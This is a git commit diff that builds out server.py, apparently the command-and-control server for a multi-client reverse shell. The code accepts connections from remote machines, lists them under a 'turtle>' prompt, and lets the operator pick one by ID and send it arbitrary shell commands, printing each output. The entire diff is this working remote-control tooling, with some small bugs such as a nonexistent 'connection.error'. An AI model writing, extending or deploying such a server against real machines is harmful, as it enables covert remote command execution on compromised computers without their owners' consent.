e508f0982318af72ca7a854b7fc37b4237801283
asjadbut <asjadb18@gmail.com>
2021-08-02 01:39:46 +0500

    last update

--- server.py
+++ server.py
@@ -1,6 +1,4 @@
-import queue
 import socket
-import sys
 from queue import Queue
 import threading
 
@@ -50,19 +48,67 @@ def accepting_connection():
             s.setblocking(1) # prevents timeout
             all_connections.append(connection)
             all_addresses.append(address)
-            print("Connection has been established | IP: {} | Port {}".format(address[0], str(address[1])))
         except:
             print("Error: " + str(socket.error))
 
 # 2nd thread functions 1-) see all clients 2-) select a client 3-) send command to the client 
 
 def start_turtle():
-    cmd = input("turtle> ")
-    if cmd == 'list':
-        list_connection()
-    elif 'select' in cmd:
-        conn = get_target()
-        if conn is not None:
-            send_target_commands(cmd)
-    else:
-        print("Command not found")
+    while True:
+        cmd = input("turtle> ")
+        if cmd == 'list':
+            list_connection()
+        elif 'select' in cmd:
+            no = cmd.split()
+            conn = get_target(int(no[1]))
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("Command not found")
+
+def list_connection():
+    print("-----------Listing clients-------" + "\n")
+    for i,connection in enumerate(all_connections):
+        try:
+            connection.send(str.encode(' '))
+            connection.recv(1024)
+        except:
+            print("Error: " + str(connection.error))
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        print("ID: {}  IP: {} Port: {}".format(str(i),str(all_addresses[i][0]),str(all_addresses[i][1])) + "\n")
+        
+def get_target(target_no):
+    return all_connections[target_no]
+
+def send_target_commands(connection):
+    while True:
+        take_cmd = input()
+        if len(take_cmd) > 0:
+            connection.send(str.encode(take_cmd))
+            client_response = str(connection.recv(1024),"utf-8")
+            print(client_response, end=" ")
+
+def create_threads():
+    for _ in range(no_of_threads):
+        t = threading.Thread(target = work)
+        t.daemon = True
+        t.start()
+def work():
+    while True:
+        x=queue.get()
+        if x==1:
+            create_socket()
+            bind_socket()
+            accepting_connection()
+        if x==2:
+            start_turtle()
+
+def create_jobs():
+    for job in job_number:
+        queue.put(job)
+    queue.join()
+
+create_threads()
+create_jobs()
